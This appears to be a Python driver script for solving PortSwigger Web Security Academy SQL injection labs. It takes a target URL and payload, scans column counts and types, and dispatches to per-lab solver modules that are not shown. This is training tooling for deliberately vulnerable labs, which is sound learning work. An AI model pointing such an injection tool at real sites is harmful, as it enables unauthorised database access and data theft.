# Base of the script is taken from https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-01/sqli-lab-01.py

import sys
import urllib3
import argparse
from sqli_utils import default_solve, get_column_types, scan_url, sqli_count_columns
from lab1 import solve as solve_1
from lab2 import solve as solve_2
from lab3 import solve as solve_3
from lab4 import solve as solve_4
from lab5 import solve as solve_5
from lab6 import solve as solve_6
from lab7 import solve as solve_7
from lab8 import solve as solve_8
from lab9 import solve as solve_9
from lab10 import solve as solve_10

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

solve_functions = {
    '00': default_solve,
    '01': solve_1,
    '02': solve_2,
    '03': solve_3,
    '04': solve_4,
    '05': solve_5,
    '06': solve_6,
    '07': solve_7,
    '08': solve_8,
    '09': solve_9,
    '10': solve_10,
}

dbms = 'MySQL',
lab_num = '00',
payload = '', 

def main(url, payload):
    if solve_functions[lab_num](url, payload) == True:
        print("[+] SQL Injection successful")
    else:
        print("[-] SQL Injection unsuccessful")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SQLi injection tool for PortSwigger websec academy labs.')
    parser.add_argument('url', metavar='URL', type=str, help="URL of the lab instance")
    parser.add_argument('--payload', dest='payload', default='', type=str, help="SQLi Payload")
    parser.add_argument('--lab', dest='lab_num', default='00', type=str, help="Number of the lab. Example: --lab 03.")
    parser.add_argument('--dbms', dest='dbms', default='MySQL', type=str, help="Which DBMS is the lab using? Available DBMS': Microsoft, MySQL, Oracle, Postgres.")
    parser.add_argument('--analyze', default=False, action='store_true', dest='analyze', help='Run the scan on the given url to get column count and types')

    args = parser.parse_args()

    lab_num = args.lab_num
    dbms = args.dbms
    payload = args.payload

    if args.analyze:
        scan_url(args.url)
    else:
        main(args.url, args.payload)